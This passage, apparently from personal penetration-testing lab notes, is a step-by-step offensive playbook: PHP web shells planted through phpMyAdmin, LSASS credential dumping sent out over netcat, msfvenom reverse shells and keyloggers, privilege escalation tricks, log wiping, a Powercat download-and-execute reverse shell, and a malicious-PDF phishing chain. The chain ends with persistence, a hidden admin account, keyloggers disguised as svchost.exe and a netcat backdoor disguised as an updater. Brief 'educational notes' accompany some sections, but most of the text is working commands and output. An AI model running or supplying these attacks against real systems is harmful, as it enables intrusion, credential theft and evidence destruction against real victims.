   3. Find tables that store page content (common names: wp_posts, content, pages, articles)
   4. Select a table and click "Browse"
   5. Find a row with content that's likely displayed on the website
   6. Click "Edit" on that row
   7. Replace the content with your PHP web shell code:

   ```php
   <?php system($_GET['cmd']); ?>
   ```

   8. Save the changes
   9. Visit the page on the website and append `?cmd=id` to the URL
   ![Database Content Modification](/images/phpmyadmin-content-edit.png)
   **Method 3: Using phpMyAdmin's Import Feature**

   1. Create a file named `shell.php` on your local machine with the following content:

   ```php

   <?php

   // Simple PHP Web Shell

   if(isset($_GET['cmd'])) {

       echo "<pre>";

       system($_GET['cmd']);

       echo "</pre>";

   } else {

       echo "Usage: ?cmd=command";

   }

   ?>

   ```

   2. In phpMyAdmin, navigate to the "Import" tab
   3. Browse and select your `shell.php` file
   4. Set the character set to "utf-8"
   5. Click "Go" to upload the file
   6. The file should now be accessible at:

   ```bash
   http://192.168.74.162/shell.php?cmd=id
   ```

   **Method 4: Creating a More Advanced Web Shell**

   For a more feature-rich web shell, you can use the SQL command to write a more advanced PHP script:

   ```sql
   SELECT '<?php

   // PHP Advanced Web Shell

   $password = "pentester"; // Change this password

   if (!isset($_POST["password"]) || $_POST["password"] != $password) {

       echo "<form method=\"post\"><input type=\"password\" name=\"password\"><input type=\"submit\" value=\"Login\"></form>";

       exit;

   }

   echo "<style>body{background-color:#000;color:#00FF00;font-family:monospace;}</style>";

   echo "<h1>PHP Web Shell</h1>";

   echo "<form method=\"post\">";

   echo "<input type=\"hidden\" name=\"password\" value=\"".$password."\">";

   echo "Command: <input type=\"text\" name=\"cmd\" style=\"width:400px;\">";

   echo "<input type=\"submit\" value=\"Execute\">";

   echo "</form>";

   if(isset($_POST["cmd"])) {

       echo "<pre>";

       system($_POST["cmd"]);

       echo "</pre>";

   }

   ?>' INTO OUTFILE '/var/www/html/admin.php';

   ```

   This creates a password-protected web shell with a simple interface.
   
   **Method 5: Using phpMyAdmin Plugins Directory**

   If you have sufficient permissions:

   1. Identify the phpMyAdmin plugins directory (often `/usr/share/phpmyadmin/plugins/` or similar)
   2. Use the SQL OUTFILE command to write a PHP file to that directory:

   ```sql

   SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/usr/share/phpmyadmin/plugins/shell.php";

   ```

   3. Access the shell via:

   ```bash
   http://192.168.74.162/phpMyAdmin/plugins/shell.php?cmd=id
   ```

   **Testing and Using Your Web Shell**

   After deploying the web shell, test it with basic commands:

   ```
   ?cmd=id                   # Show user ID

   ?cmd=whoami               # Show current user

   ?cmd=uname%20-a           # Show system information

   ?cmd=cat%20/etc/passwd    # View passwd file

   ?cmd=ls%20-la             # List files with details

   ?cmd=pwd                  # Show current directory

   ```

   For more complex commands, use URL encoding for special characters:

   ```
   ?cmd=find%20/%20-name%20%22*.conf%22%20-type%20f%202>/dev/null
   ```

   This command searches for all .conf files on the system.

---
## OS Credential Dumping

### LSASS Memory Analysis

The Local Security Authority Subsystem Service (lsass.exe) is a critical component of the Windows security subsystem responsible for managing user authentication and creating security tokens for login sessions.

#### Detailed Example: Dumping LSASS Memory with Procdump

```bash
# On Windows:
# 1. Download Procdump from Sysinternals
# 2. Identify LSASS process ID
PS > Get-Process -Name lsass
# 3. Dump the process memory
PS C:\Users\IEUser\Downloads\Procdump> .\procdump.exe -ma 436 lsass.dmp

# Transfer the dump file for analysis
# On Kali Linux:
# 1. Set up a listener
└─$ nc -vlp 123 > lsass.dmp
# On Windows:
C:\netcat-1.11> nc.exe 192.168.1.142 123 < C:\Users\IEUser\Downloads\Procdump\lsass.dmp

# Analyze the dump file
└─$ pypykatz lsa minidump lsass.dmp
```

**Educational Notes:**

- This technique demonstrates how credentials are stored in memory
- Understanding this process helps in developing better credential protection mechanisms
- LSASS memory dumps contain sensitive authentication data that should be protected


## Keylogging Techniques

### Creating an Educational Keylogger with Msfvenom

This example demonstrates how keyloggers can capture sensitive information, highlighting the importance of endpoint security.

#### Detailed Example: Msfvenom Keylogger

```bash
# 1. Generate payload
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.74.136 LPORT=4444 -f exe -o shell.exe

# 2. Set up web server to deliver payload
root@kali:~# python3 -m http.server

# 3. Set up handler in Metasploit
root@kali:~# msfconsole
msf > use multi/handler
msf exploit(multi/handler) > set LHOST 192.168.74.136
msf exploit(multi/handler) > set LPORT 4444
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > exploit

# 4. After connection is established:
meterpreter > run post/windows/gather/hashdump
meterpreter > ps
meterpreter > ps | grep logon

# 5. Migrate to winlogon process for persistence
meterpreter > migrate 868
[*] Migrating from 6080 to 868...
[*] Migration completed successfully.

# 6. Start keylogger
meterpreter > keyscan_start
Starting the keystroke sniffer ...

# 7. Dump captured keystrokes
meterpreter > keyscan_dump
Dumping captured keystrokes...
```

![[Pasted image 20250415084921.png]]
![[Pasted image 20250415085248.png]]
**Educational Notes:**

- This demonstrates why users should be cautious about downloading and executing files
- Shows the importance of endpoint protection solutions
- Highlights how process migration can be used for persistence
## Privilege Escalation Methods

### Four Key Privilege Escalation Techniques

#### 1. Kernel Exploits

```bash
# Example: DirtyCow exploit (Linux Kernel <= 3.19.0-73.8)
# 1. Identify kernel version
$ uname -a

# 2. Search for applicable exploits
$ searchsploit Linux Kernel 3.19

# 3. Download, compile and execute the exploit
# This particular exploit replaces the 'root' user with a new user by editing /etc/passwd
```

**Educational Notes:**

- Kernel exploits leverage vulnerabilities in the operating system kernel
- Keeping systems updated is critical to prevent these attacks
- Privilege separation helps contain the impact of successful exploits
#### 2. Exploiting Services Running as Root

```bash
# Example: Exploiting MySQL running as root
$ ps -aux | grep root
# Identify MySQL running as root

mysql> select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')
mysql> exit
$ /tmp/sh
# whoami
root
```

**Educational Notes:**

- Services should run with the minimum required privileges
- Database services rarely need root privileges
- Containerization and isolation help mitigate these risks
#### 3. Exploiting SUID Executables

```bash
# Find SUID executables
$ find / -perm -u=s -type f 2>/dev/null

# Example: Exploiting NMAP with SUID bit
$ nmap --interactive
nmap> !sh
```

**Educational Notes:**

- SUID (Set User ID) allows programs to run with the owner's permissions
- Regular audits of SUID binaries are essential
- Modern systems limit SUID usage and capabilities
#### 4. Exploiting Sudo Rights

```bash
# List sudo permissions
$ sudo -l

# Example: Exploiting sudo rights for the 'find' command
$ sudo find /home -exec sh -i \;
```

**Educational Notes:**

- Sudo configurations should follow the principle of least privilege
- Regular audits of sudo permissions are necessary
- Command restrictions and path controls can limit exploitation
## File Hiding Techniques

### Hiding Files with Attributes

```bash
# On Windows, hide a file using attributes
attrib +h [file/directory]

# Example:
attrib +h secret.txt
```

**Educational Notes:**

- Simple attribute-based hiding is easily detected
- File system forensics can reveal hidden files
- This technique is primarily effective against casual users
### NTFS File Streaming

NTFS alternate data streams allow hiding data within legitimate files.

```bash
# Create a normal file
notepad test.txt
# Add content and save

# Check file size
dir test.txt

# Create a hidden stream
notepad test.txt:hidden.txt
# Add secret content and save

# Check file size again (remains unchanged)
dir test.txt

# Access the hidden content
notepad test.txt:hidden.txt
```

**Educational Notes:**

- NTFS streams are a Windows-specific feature
- Standard file operations don't reveal streams
- Specialized forensic tools can detect and extract streams
- This technique demonstrates why thorough forensic analysis is important
## Steganography Examples

### Hiding Data in Images with Stegosuite

```bash
# Install stegosuite
apt-get install stegosuite

# Launch the application
stegosuite

# Use the GUI to:
# 1. Select an image
# 2. Enter a message
# 3. Set a password
# 4. Click "Embed" to hide the message

# To extract:
# 1. Open the modified image
# 2. Enter the password
# 3. Click "Extract"
```

**Educational Notes:**

- Steganography hides data within other data types
- Visual inspection rarely reveals steganographic content
- Password protection adds encryption to hidden data
### Hiding Data with Steghide

```bash
# Install steghide
apt-get install steghide

# Create a secret message
nano secret.txt

# Hide the message in an image
steghide embed -cf image.jpg -ef secret.txt -p password

# Extract the hidden message
steghide extract -sf image.jpg
```

**Educational Notes:**

- Steghide works with various file formats
- Statistical analysis may detect anomalies in modified files
- Combining steganography with encryption increases security
### Text-Based Steganography with Snow

```bash
# Using Snow for whitespace steganography
# Hide message in text file
snow -C -m "This is a top secret message !!!!" -p "password" infile.txt outfile.txt

# Decrypt the message
snow -C -p "password" outfile.txt
```

**Educational Notes:**

- Whitespace steganography uses spaces and tabs to encode data
- This technique is particularly effective in text files
- It demonstrates how seemingly innocuous formatting can hide information
### StegoMagic for Advanced File Hiding

```bash
# StegoMagic allows hiding:
# - Text messages in any file (StegoMagic_TXT.exe)
# - Binary files within other files (StegoMagic_BIN.exe)

# Examples:
# - Hide JPG in EXE file
# - Hide video file in image file
```

**Educational Notes:**

- Advanced steganography can hide any file type within another
- File size limitations can be overcome with sophisticated techniques
- Detection becomes more difficult with advanced methods
## Anti-Forensics Techniques

### Covering Tracks and Erasing Evidence

```bash
# Disable Windows auditing (requires administrator privileges)
auditpol /set /category:"System" /success:disable /failure:disable

# Clear Windows Event Logs
elsave.exe -c Application
elsave.exe -c Security
elsave.exe -c System

# On Linux systems
# Clear bash history
history -c
rm ~/.bash_history

# Clear system logs
echo > /var/log/syslog
echo > /var/log/auth.log
```

**Educational Notes:**

- Log analysis is a critical part of incident response
- System administrators should protect logs from tampering
- Centralized and secure log management helps preserve evidence
- Unexpected gaps in logs can indicate anti-forensic activity

---

# PowerCat

### PowerShell Reverse Shell with Powercat

This example demonstrates how to establish a reverse shell connection using PowerShell and Powercat.

```bash
# On Kali Linux:
# 1. Clone the repository
┌──(kali㉿kali)-[~/Desktop]
└─$ git clone https://github.com/besimorhino/powercat.git

cd powercat

# 2. Start a Python HTTP server to host the script
┌──(kali㉿kali)-[~/Desktop/powercat]
└─$ sudo python -m http.server 8000

# 3. Start a Netcat listener to receive the connection
┌──(kali㉿kali)-[~/Desktop/]
└─$ sudo apt-get install netcat
┌──(kali㉿kali)-[~/Desktop/]
└─$ nc -lp 4444

# On Windows:
# 1. Create a PowerShell script named back.ps1 with the following content:
powershell -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.74.171:8000/powercat.ps1'); powerrcat -c 192.168.74.171 -p 4444 -e cmd"

# 2. Execute the script
# This will establish a reverse shell connection to the Kali machine

# On Kali Linux:
# You should now have a command prompt from the Windows machine
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lp 4444
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.
C:\Users\IEUser\Desktop>
```

![[Pasted image 20250429101318.png]]

---

# PDF Injection

## Windows Exploitation: PDF Injection Attack

This section demonstrates a comprehensive Windows exploitation scenario using a PDF injection attack, followed by post-exploitation techniques.

### Initial Access: Malicious PDF Creation

```bash
# 1. Generate malicious PDF with embedded executable
msf6 > use exploit/windows/fileformat/adobe_pdf_embedded_exe
msf6 exploit(windows/fileformat/adobe_pdf_embedded_exe) > set FILENAME facture_finale2021.pdf
msf6 exploit(windows/fileformat/adobe_pdf_embedded_exe) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(windows/fileformat/adobe_pdf_embedded_exe) > set LHOST 192.168.74.171
msf6 exploit(windows/fileformat/adobe_pdf_embedded_exe) > set LPORT 4444
msf6 exploit(windows/fileformat/adobe_pdf_embedded_exe) > exploit

# 2. Zip the PDF with password protection
┌──(kali㉿kali)-[~/Desktop]
└─$ zip -e test.zip test.pdf
Enter password: test
Verify password: test

# 3. Set up handler to receive connection
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.74.171
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit

# 4. Send ZIP file to victim
# When the victim extracts and opens the PDF, you'll receive a meterpreter session
```

![[Pasted image 20250429102221.png]]
![[Pasted image 20250429102905.png]]
![[Pasted image 20250429103324.png]]

### Post-Exploitation: Privilege Escalation

```bash
# 5. Attempt to gain SYSTEM privileges
meterpreter> getsystem
[*] Obtained system privileges

# 6. Establish persistence
meterpreter> run persistence -U -i 5 -p 2021 -r 10.10.10.128
# -U: Start the agent when the user logs on
# -i: Connect back every 5 seconds
# -p: Use port 2021
# -r: Connect back to this IP address
```

### Post-Exploitation: User Creation and RDP Access

```bash
# 7. Create a new administrative user
meterpreter> shell
C:\Windows\system32> net user /add Hackdrill2021 nacsdrill@
C:\Windows\system32> net localgroup administrators Hackdrill2021 /add

# 8. Enable Remote Desktop
C:\Windows\system32> REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# 9. Enable RDP through Metasploit module
meterpreter> run getgui -e
```
### Post-Exploitation: Network Manipulation

```bash
# 10. Modify hosts file to redirect traffic
meterpreter> shell
C:\Windows\system32> echo 10.10.10.50 facebook.com >> %WINDIR%\System32\Drivers\Etc\Hosts
```
### Post-Exploitation: Keylogger Installation

```bash
# 11. Download and install keylogger
┌──(kali㉿kali)-[~/Desktop]
└─$ wget https://github.com/ajayrandhawa/Keylogger/blob/master/keylogger.rar

# 12. Extract and prepare keylogger files
# Upload keylogger to victim
meterpreter> mkdir antivirus-update
meterpreter> cd antivirus-update
meterpreter> upload keylogger/rundll33.exe
meterpreter> upload keylogger/svchost.exe

# 13. Execute keylogger with hidden windows
meterpreter> execute -f svchost.exe -i -H
meterpreter> execute -f rundll33.exe -i -H
```
### Post-Exploitation: Credential Harvesting

```bash
# 14. Dump password hashes
meterpreter> run post/windows/gather/hashdump

# 15. Crack password hashes offline
┌──(kali㉿kali)-[~/Desktop]
└─$ hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
### Post-Exploitation: Persistent Backdoor with Scheduled Tasks

```bash
# 16. Create firewall rule to allow backdoor traffic
meterpreter> shell
C:\Windows\system32> netsh advfirewall firewall add rule name="Software Updater" dir=in action=allow protocol=TCP localport=2022

# 17. Create batch file for backdoor on Kali
┌──(kali㉿kali)-[~/Desktop]
└─$ cat > update.bat << EOF
@echo off
start /min update2021.exe -L -d -p 2022 -t -e cmd.exe
EOF

# 18. Download and rename netcat
┌──(kali㉿kali)-[~/Desktop]
└─$ wget https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
└─$ unzip netcat-win32-1.11.zip
└─$ cp nc.exe update2021.exe

# 19. Upload files to victim
meterpreter> mkdir C:\\Windows\\System32\\updatelist
meterpreter> cd C:\\Windows\\System32\\updatelist
meterpreter> upload update2021.exe
meterpreter> upload update.bat

# 20. Create scheduled task for persistence
meterpreter> run scheduleme -m 1 -c C:/Windows/System32/updatelist/update.bat
```

----

